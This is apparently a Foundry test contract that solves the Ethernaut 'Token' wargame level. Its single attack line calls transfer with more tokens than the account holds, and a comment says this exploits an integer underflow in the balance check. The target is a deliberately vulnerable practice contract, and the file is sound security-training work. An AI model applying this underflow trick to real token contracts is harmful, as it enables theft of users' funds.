pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Token/TokenFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract TokenTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory telephoneFactory = new TokenFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Token ethernautToken = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        ethernautToken.transfer(address(0), 1 ether); // make an underflow in `balances[msg.sender] - _value`
        // uint256 balance = ethernautToken.balanceOf(eoaAddress);
        // emit log_named_uint("balance", balance);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
